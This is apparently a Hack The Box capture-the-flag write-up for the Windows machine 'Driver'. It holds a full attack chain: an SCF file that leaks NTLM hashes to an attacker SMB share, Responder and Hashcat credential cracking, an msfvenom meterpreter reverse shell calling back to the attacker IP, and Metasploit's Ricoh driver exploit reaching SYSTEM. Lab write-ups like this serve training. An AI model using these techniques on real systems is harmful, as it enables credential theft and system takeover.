# HTB Write-Up: Driver

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Driver) |
| Difficulty | Easy |
| OS | Windows |
| Date | October 19, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access — Web Portal & Default Credentials](#initial-access-web-portal-default-credentials)
3. [Initial Access — NTLM Hash Capture via SCF File Upload](#initial-access-ntlm-hash-capture-via-scf-file-upload)
4. [Shell Access — Hash Cracking & WinRM](#shell-access-hash-cracking-winrm)
5. [Privilege Escalation — Ricoh Driver Exploit (CVE-2019-19033)](#privilege-escalation-ricoh-driver-exploit-cve-2019-19033)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.95.238 --ulimit=5000
```

**Open Ports:**

| Port | Service | Details |
| --- | --- | --- |
| 80 | HTTP | MFP Firmware Update Center web portal |
| 135 | MSRPC | Microsoft Windows RPC |
| 445 | SMB | microsoft-ds |
| 5985 | WinRM | Windows Remote Management |

With SMB, WinRM, and a web portal exposed, and no AD-specific ports (88, 389) open, this looked like a standalone Windows host rather than a domain controller — the web application on port 80 stood out as the most promising entry point.

## Initial Access — Web Portal & Default Credentials

Browsing to `http://10.129.95.238/` presented a login form. Default credentials were tried first:

```
admin:admin
```

These worked, granting access to an **MFP Firmware Update Center** — a web application for pushing firmware updates to a multi-function printer. The upload feature accepted a firmware file for update, and testing showed there was no file type or extension restriction on the upload: any file could be submitted. This absence of validation is what made the next step possible.

## Initial Access — NTLM Hash Capture via SCF File Upload

With no upload restrictions in place, the chosen attack was **NTLM caching via SCF file upload**. An `.scf` (Shell Command File) file can be crafted so that its icon path points to an attacker-controlled SMB share. When Windows Explorer — or, in this case, the server-side component handling the uploaded firmware file — renders the icon, it reaches out over SMB to fetch it, leaking the host's NetNTLM hash in the process with no user interaction needed.

An `@Inventory.scf` file was created with the following content:

```
[Shell]
Command=2
IconFile=\\10.10.14.25\Drive\legit.ico
[Taskbar]
Command=ToggleDesktop
```

**Responder** was started to listen for the incoming authentication attempt:

```bash
sudo responder -w -v -I tun0
```

The `@Inventory.scf` file was then uploaded through the firmware update page. Shortly after submission, Responder captured an NTLMv2-SSP authentication attempt from the host:

```
[SMB] NTLMv2-SSP Client   : 10.129.95.238
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:da1870904bac8b4f:7E8E0AC0F6F9CAC55143205F965BF881:0101000000000...0000
```

The firmware upload handler had processed the file in a way that triggered an icon lookup, forcing the `DRIVER\tony` service account to authenticate to the attacker's machine and disclosing its hash.

## Shell Access — Hash Cracking & WinRM

The captured hash was saved to a file and cracked offline with **Hashcat** against the rockyou wordlist:

```bash
nano hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
TONY::DRIVER:da1870904bac8b4f:7e8e0ac0f6f9cac55143205f965bf881:...:liltony
```

Recovered credentials: **`tony:liltony`**

These were used to connect via **evil-winrm**:

```bash
evil-winrm -i 10.129.95.238 -u tony -p liltony
```

The user flag was retrieved from the desktop:

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\tony\desktop> type user.txt
9ea9b4df532b6055db120458dfc8830a
```

## Privilege Escalation — Ricoh Driver Exploit (CVE-2019-19033)

### Enumeration with winPEAS

**winPEAS** was run on the box to look for common misconfigurations. Its PowerShell Settings section pointed to a readable command history file:

```
PowerShell v5 Version: 5.0.10240.17146
PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS history size: 134B
```

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

Reading command history for traces of prior admin activity is a standard enumeration habit, and here it paid off directly: the history showed a printer named `RICOH_PCL6` had been added using driver **RICOH PCL6 UniversalDriver V4.23**. That specific driver name and version is enough to check against known exploits, and it matches Metasploit's `ricoh_driver_privesc` module — tracked as **CVE-2019-19033** (Ricoh Driver Privilege Escalation).

The flaw itself is a permissions issue: the Ricoh driver's installation directory allows standard, low-privileged users to write to it. The exploit drops a malicious driver payload (`headerfooter.dll`) by installing a rogue printer through that writable path; when Windows loads the driver to service the printer, the payload executes with **NT AUTHORITY\\SYSTEM** privileges.

### Building and Delivering a Payload

A reverse shell executable was generated with **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f exe -o shell.exe
```

It was uploaded through the existing evil-winrm session:

```
upload shell.exe
```

A Metasploit multi/handler was started to catch the callback:

```
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

### Stabilizing the Session

Once the meterpreter session landed, running `ps` and migrating into `explorer.exe` kept the shell stable:

```
meterpreter > migrate 3208
[*] Migrating from 2900 to 3208...
[*] Migration completed successfully.
```

```
 3208  3184  explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
```

The initial reverse-shell process tends to be short-lived, so migrating into a stable, long-running process avoids losing the session if the original process exits. `explorer.exe` is not a SYSTEM process — it runs in the context of the logged-on user (`DRIVER\tony`) — so this step only buys stability, not elevated privileges; the privilege escalation itself still has to come from the printer driver exploit run against this stable session.

```
meterpreter > background
```

### Running the Exploit

The session was backgrounded and the `ricoh_driver_privesc` module configured and run against it:

```
use ricoh_driver_privesc
set SESSION 1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 5555
run
```

**Output:**

```
[*] Started reverse TCP handler on 10.10.14.25:5555
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer AVQUoJkG...
[*] Sending stage (248902 bytes) to 10.129.95.238
[+] Deleted C:\Users\tony\AppData\Local\Temp\lrrCLl.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 2 opened (10.10.14.25:5555 -> 10.129.95.238:49421) at 2026-10-19 11:06:42 +0400
[*] Deleting printer AVQUoJkG
```

The second session confirmed SYSTEM:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Root Flag

```
meterpreter > shell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
f26f482c1c83178a4cf9fdbbbdd7ca0f
```
